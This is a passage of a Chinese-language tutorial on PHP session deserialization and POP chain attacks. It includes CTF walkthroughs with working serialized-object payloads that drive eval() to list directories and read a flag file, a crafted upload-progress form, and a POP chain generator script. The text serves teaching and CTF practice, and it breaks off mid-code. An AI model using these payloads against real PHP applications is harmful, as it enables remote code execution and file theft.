<p>php中的 session 内容 默认是以文件方式来存储的，由 <code>session.save_handler</code> 来决定。文件名由<code>sess_sessionid</code>命名，文件内容则为session序列化后的值。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    $_SESSION[&apos;name&apos;] = &apos;twosmi1e&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在文件配置中 <code>session.save_path</code> 路径下会生成对应的 <code>session</code> 文件</p>
<ul>
<li><p><code>php_serialize</code></p>
<p>经过serialize()函数序列化处理的 <strong>数组</strong> </p>
<p><code>a:1:{s:4:&quot;name&quot;;s:8:&quot;twosmi1e&quot;;}</code></p>
</li>
<li><p><code>php</code></p>
<p>键名 + 竖线 + 经过 <code>serialize()</code> 函数序列化处理的值 </p>
<p><code>name|s:8:&quot;twosmi1e&quot;;</code></p>
</li>
<li><p><code>php_binary</code></p>
<p>键名的长度对应的 ASCII 字符 + 键名 + 经过 <code>serialize()</code> 函数序列化处理的值 </p>
<p><code>names:8:&quot;twosmi1e&quot;;</code></p>
</li>
</ul>
<p><strong>注：自 PHP 5.5.4 起可以使用 php_serialize</strong></p>
<p>上述三种处理器中， <code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数，并且不会有 <code>php</code> 和 <code>php_binary</code>所具有的限制。 </p>
<p>使用较旧的序列化处理器导致 <code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符( <code>|</code>   <code>!</code> ) </p>
<p> 三种处理器的存储格式差异，就会造成在session序列化和反序列化处理器设置不当时的安全隐患 </p>
</li>
</ul>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="由乌云白帽子-ryat-师傅于-2015-12-12-在-php官网上提出来，乌云编号：71101"><a href="#由乌云白帽子-ryat-师傅于-2015-12-12-在-php官网上提出来，乌云编号：71101" class="headerlink" title="由乌云白帽子 ryat 师傅于 2015-12-12 在 php官网上提出来，乌云编号：71101"></a>由乌云白帽子 <code>ryat</code> 师傅于 <code>2015-12-12</code> 在 php官网上提出来，乌云编号：<code>71101</code></h3>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action =“ upload.php” method =“ POST” enctype =“ multipart / form-data”&gt;    &lt;input type =“ hidden” name =“ PHP_SESSION_UPLOAD_PROGRESS” value =“ ryat” /&gt;    &lt;input type =“ file” name =“ file” /&gt;    &lt;input type =“ submit” /&gt;&lt;/ form&gt;</span><br></pre></td></tr></table></figure>

<p>   <code>$_SESSION</code> 中的键值就会为 <code>$_SESSION[&quot;upload_progress_ryat&quot;]</code> ，在会话上传过程中，将对会话数据进行序列化/反序列化，序列化格式由 <code>php.ini</code> 中的 <code>session.serialize_handler</code> 选项设置。 这意味着，如果在脚本中设置了不同的 <code>serialize_handler</code> ，那么可以导致注入任意 <code>session</code> 数据。</p>
<p>  形成的原理就是在用 <code>session.serialize_handler = php_serialize</code> 存储的字符可以引入 | , 再用 <code>session.serialize_handler = php</code> 格式取出 <code>$_SESSION</code> 的值时， <code>|</code> 会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞</p>
<ul>
<li><p>简单示例</p>
<ul>
<li><p><code>session.php</code> 文件 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&apos;session&apos;] = $_GET[&apos;session&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>session 的初始内容</p>
<p><code>a:1:{s:7:&quot;session&quot;;s:5:&quot;hello&quot;;}</code></p>
</li>
<li><p><code>class.php</code> 文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">error_reporting(0);  </span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php&apos;);  </span><br><span class="line">session_start();    </span><br><span class="line">class XianZhi</span><br><span class="line">&#123;</span><br><span class="line">	public $name = &apos;panda&apos;;    </span><br><span class="line">	function __wakeup()</span><br><span class="line">	&#123;      </span><br><span class="line">		echo &quot;Who are you?&quot;;    </span><br><span class="line">	&#125;    </span><br><span class="line">	function __destruct()</span><br><span class="line">	&#123;      </span><br><span class="line">		echo &apos;&lt;br&gt;&apos;.$this-&gt;name;    </span><br><span class="line">	&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$str = new XianZhi(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>访问页面显示：<code>panda</code></li>
</ul>
</li>
<li><p>两个文件的作用</p>
<p><code>session.php</code> 文件的处理器是 <code>php_serialize</code> ， <code>class.php</code> 文件的处理器是 <code>php</code> ， <code>session.php</code> 文件的作用是传入可控的 <code>session</code>值， <code>class.php</code> 文件的作用是在反序列化开始前输出 <code>Who are you?</code> ，反序列化结束的时候输出 <code>name</code> 值 </p>
</li>
<li><p>利用</p>
<p>要在 <code>session.php</code> 文件传入 <code>|</code> + <code>序列化</code> 格式的值，然后再次访问 <code>class.php</code> 文件的时候，就会在调用 <code>session</code> 值的时候，触发此 BUG </p>
</li>
<li><p>生成序列化字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class XianZhi</span><br><span class="line">&#123;    </span><br><span class="line">	public $name;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;      </span><br><span class="line">    	echo &quot;Who are you?&quot;;    </span><br><span class="line">    &#125;    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;      </span><br><span class="line">    	echo &apos;&lt;br&gt;&apos;.$this-&gt;name;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;    	</span><br><span class="line">$str = new XianZhi();    </span><br><span class="line">$str-&gt;name = &quot;xianzhi&quot;;    </span><br><span class="line">echo serialize($str);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>序列化字符串：<code>O:7:&quot;XianZhi&quot;:1:{s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;}</code></p>
<p>payload：<code>|O:7:&quot;XianZhi&quot;:1:{s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;}</code></p>
</li>
<li><p>用payload 访问 session.php ，生成session</p>
<p><code>a:1:{s:7:&quot;session&quot;;s:44:&quot;|O:7:&quot;XianZhi&quot;:1:{s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;}&quot;;}</code></p>
</li>
<li><p>访问 class.php，触发漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Who are you?</span><br><span class="line">panda</span><br><span class="line">xianzhi</span><br></pre></td></tr></table></figure>

<p>说明构造传入的字符串被反序列化成 <code>XianZhi</code>  对象</p>
</li>
</ul>
</li>
</ul>
<h2 id="2019极客巅峰-lol-link"><a href="#2019极客巅峰-lol-link" class="headerlink" title="2019极客巅峰    lol   link"></a>2019极客巅峰    <code>lol</code>   <a href="https://forum.90sec.com/t/topic/573" target="_blank" rel="noopener">link</a></h2><h2 id="Jarvisoj-PHPINFO"><a href="#Jarvisoj-PHPINFO" class="headerlink" title="Jarvisoj  PHPINFO"></a>Jarvisoj  <a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">PHPINFO</a></h2>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//A webshell is wait for you</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;phpinfo&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&apos;sessiontest.php&apos;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>题目采用 php 5.6.21(查看phpinfo.php），PHP版本大于5.5.4，默认使用 <code>php_serialize</code> </p>
</li>
<li><p>默认为php_serialize而index.php中又使用了php，反序列化和序列化使用的处理器不同，由于格式的原因会导致数据无法正确反序列化，那么就可以通过构造伪造任意数据。 </p>
</li>
<li><p><code>session.upload_progress.enabled</code> 为On </p>
</li>
<li><p><a href="https://www.php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">PHP手册</a></p>
<blockquote>
<p>Session 上传进度<br>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态<br>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name 同名变量时，上传进度可以在 <code>$_SESSION</code> 中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, <strong>索引</strong>是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 </p>
</blockquote>
<p> 通常这些键值可以通过读取INI设置来获得 ，如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$key = ini_get(&quot;session.upload_progress.prefix&quot;) . ini_get(&quot;session.upload_progress.name&quot;);</span><br><span class="line">var_dump($_SESSION[$key]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>上传进度数组的结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;&lt;?php echo ini_get(&quot;session.upload_progress.name&quot;); ?&gt;&quot; value=&quot;123&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;file2&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来构造数据写入 session </p>
</li>
<li><p>在题目代码中，没有某个值是用来接受我们传入的数据，并储存到$_SESSION中的。</p>
<p>其实我们是有办法传入$_SESSION 数据的，这里就利用到了|的反序列化问题</p>
</li>
<li><p>构造POST提交表单 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;test XXE&lt;/title&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--不对字符编码--&gt;</span><br><span class="line">	    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">	    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">	    &lt;input type=&quot;submit&quot; value=&quot;go&quot; /&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>TIPS： 注意enctype属性</p>
<ul>
<li><p><code>multipart/form-data</code></p>
<p>不对字符编码，在使用包含文件上传控件表单时，必须使用该值</p>
</li>
<li><p><code>application/x-www-form-urlencoded</code></p>
<p>在发送前编码所有字符（默认）</p>
</li>
<li><p><code>text/plain</code></p>
<p>空格转换为 <code>+</code> ，但不对特殊字符编码</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>构造序列化字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz=&apos;print_r(dirname(__FILE__));&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new OowoO();</span><br><span class="line">$a = serialize($obj);</span><br><span class="line"></span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>

<p>注意需要转义，抓包吧filename改为payload<br>最终提交为：<code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:27:\&quot;print_r(dirname(__FILE__));\&quot;;}</code></p>
</li>
<li><p>查看当前目录</p>
</li>
<li><p>目录扫描</p>
<p><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}</code></p>
</li>
<li><p>读取flag，这里需要注意转义</p>
<p><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code></p>
<p>flag：<code>$flag=&quot;CTF{4d96e37f4be998c50aa586de4ada354a}&quot;;</code></p>
</li>
</ul>
<h3 id="安洵杯-Double-s"><a href="#安洵杯-Double-s" class="headerlink" title="安洵杯 Double-s"></a>安洵杯 Double-s</h3><p>  但是这道题好像不需要用到 session 反序列化，有可控变量直接反序列化</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class Anti</span><br><span class="line">&#123;</span><br><span class="line">    public $info;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;info = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;aa&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    if(unserialize($_GET[&apos;aa&apos;])==&apos;phpinfo&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">        $m = new Anti();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    header(&quot;location:index.html&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>  payload：</p>
<p>  <code>http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></p>
<h2 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h2><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><p>  POP，面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。 </p>
<p>  在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>  二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：<strong>进行反序列化的数据能够被用户输入所控制。</strong> </p>
<h3 id="POP链利用思路"><a href="#POP链利用思路" class="headerlink" title="POP链利用思路"></a>POP链利用思路</h3><p>  一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。 </p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 = $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&apos;string&apos;];</span><br><span class="line">unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>  需要构造POP链， 执行GetFlag类中的get_flag()函数 </p>
<ul>
<li><p><code>string1</code> 中的 <code>__tostring</code> 存在 <code>$this-&gt;str1-&gt;get_flag()</code>，分析一下要自动调用 <code>__tostring()</code> 需要把类<code>string1</code>当成字符串来使用，因为调用的是参数 <code>str1</code> 的方法，所以需要把<code>str1</code>赋值为类<code>GetFlag</code>的对象。</p>
</li>
<li><p>发现类<code>func</code> 中存在<code>__invoke</code>方法执行了字符串拼接，所以把 <code>mod1</code> 赋值为 <code>string1</code> 类的对象便可以触发 <code>__toString()</code> ，需要把<code>func</code>对象当成函数使用，才回自动调用<code>__invoke</code></p>
</li>
<li><p>在 <code>funct</code> 中找到了函数调用（<code>mod1</code> )，需要把 <code>mod1</code> 赋值为<code>func</code> 类的对象，又因为函数调用在<code>__call</code>方法中，且参数为<code>$test2</code> ，即无法调用 <code>test2</code>方法时自动调用 <code>__call</code>方法；</p>
</li>
<li><p>在<code>Call</code>中的<code>test1</code>方法中存在<code>$this-&gt;mod1-&gt;test2();</code>，需要把<code>$mod1</code>赋值为<code>funct</code>的对象，让<code>__call</code>自动调用。</p>
</li>
<li><p>查找<code>test1</code>方法的调用点，在<code>start_gg</code>中发现<code>$this-&gt;mod1-&gt;test1();</code>，把 <code>$mod1</code>赋值为 <code>Call</code> 类的对象，等待<code>__destruct()</code>自动调用。</p>
</li>
</ul>
<ul>
<li><p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1 = new Call();//把$mod1赋值为Call类对象</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1 = new funct();//把 $mod1赋值为funct类对象</span><br><span class="line">        &#125;</span><br><span class="line">        public function test1()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1= new func();//把 $mod1赋值为func类对象</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 = $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1= new string1();//把 $mod1赋值为string1类对象</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;        </span><br><span class="line">                $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1= new GetFlag();//把 $str1赋值为GetFlag类对象          </span><br><span class="line">        &#125;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;        </span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;</span><br><span 